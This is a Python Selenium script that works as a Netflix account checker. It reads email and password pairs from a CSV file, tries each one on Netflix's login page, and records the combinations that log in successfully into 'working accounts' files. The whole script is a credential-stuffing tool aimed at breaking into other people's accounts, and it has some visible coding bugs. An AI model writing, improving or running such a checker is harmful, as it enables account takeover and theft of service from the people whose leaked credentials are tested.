import pandas as pd
from seleniumwire import webdriver
import requests
from bs4 import BeautifulSoup as Soup
from csv import reader
from csv import writer
import time
import os
import csv


browser = webdriver.Chrome(r'path to your chromedriver')

print('Starting chromedriver')

status = 0
elementStatus = ''
errorStatus = ''
email = ''
pwd = ''
row_count = 0
header = ['Email', 'Password']
def writetoCSV(count, email, pwd):
    with open('Working_Accounts_Netflix.csv','a', newline='') as file:
        write = csv.writer(file)
        #writer.writerow(["SN", "Email", "Password"])
        write.writerow([count,email,pwd])
        browser.close()
def updatefile(updatedlist):
    with open("netflix.csv","w",newline="") as f:
        Writer=csv.writer(f)
        Writer.writerow(header)
        Writer.writerows(updatedlist)
        print("File has been updated")
with open('netflix.csv', 'r') as read_obj:
             #if row_count == -1:
            #     read_obj.close()
             csv_reader = reader(read_obj)
             header = next(csv_reader)
             if header != None:
              for row in csv_reader:
                    Username = row[0]
                #    verify = verify_email(Username)
                #print(Username)
                    Password = row[1]
                #print(Password)
                    if not Username :
                        continue
                        # Sends username
                    else :
                        #row_count = sum(1 for row in csv_reader) - 1 # -1 to not count the header row
                        #print("Rows Left: ", row_count )
                        browser.get('https://www.netflix.com/in/login')
                        browser.implicitly_wait(1)
                        email = Username
                        id_box = browser.find_element_by_css_selector('#id_userLoginId')
                        id_box.clear()
                        id_box.send_keys(Username)
                        print(Username)
                        # Sends password
                    if not Password or len(Password) < 6:
                        continue
                    else:
                        pwd = Password
                        Pass_box = browser.find_element_by_css_selector('#id_password')
                        Pass_box.send_keys(Password)
                        print(Password)
                        # Click login
                    if not Username and not Password :
                             continue
                    else:
                        Send = browser.find_element_by_css_selector('.btn').click()
                        browser.implicitly_wait(10)
                    try:
                            #<div data-uia="text" class="ui-message-contents">Sorry, something went wrong. Please try again later.</div>
                            try:
                               elementStatus = browser.find_element_by_link_text("reset your password.").text
                            except:
                                print('')
                            try:
                               errorStatus = browser.find_element_by_link_text('create a new account').text
                            except:
                                print('')
                            #try:
                                timeOutError = browser.find_element_by_class_name('ui-message-contents').text
                                print(timeOutError)
                            #except:
                            #    print('')

                            if(timeOutError == 'Sorry, something went wrong. Please try again later.'):
                                  print('Timeout error')
                                  browser.quit()
                                  print('Restarting  the program...')
                                 # os.system('cmd /k "cls"')
                                  #time.sleep(3)
                                  os.system('cmd /k "python web-input.py"')
                                  #restartPgm()
                            elif(elementStatus == 'reset your password.' or  errorStatus == 'create a new account'
                            or timeOutError == 'Incorrect password. Please try again or you can reset your password.'):
                                  print("Login failed")
                                  id_box.clear()
                                  Pass_box.clear()
                                  browser.close()
                                  status = 0
                            else:
                               print('Login Successful')
                               url = "https://www.netflix.com/browse"
                               browser.navigate().to(url)
                               if(browser.current_url == url):
                                   status = 1
                               out_file = open('Working_passwords_netflix.txt','a')
                               out_file.write('Email: ', email, 'Password: ', pwd)
                               out_file.close()
                               with open('Working_Accounts_Netflix.csv', 'w', newline='') as file:
                                   count = 1
                                   write = writer(file)
                                   write.writerow(["SN", "Email", "Password"])
                                   writetoCSV(count,str(email),str(pwd))
                                   count = count + 1
                    except:
                            if status == 0:
                                #print(email)
                                updatedlist=[]
                                print("Errors during login - Login failed")
                                with open("netflix.csv",'r',newline="") as f_in:
                                    reader = csv.reader(f_in)
                                    next(reader) # skipping headers
                                    for rowval in reader: #for every row in the file
                                     # print("Row: ",rowval[0])
                                      if rowval[0] != email:
                                          updatedlist.append(rowval)
                                updatefile(updatedlist)
                                time.sleep(15)
                            else :
                                print("No errors during login - Login Successful")
                                time.sleep(25)
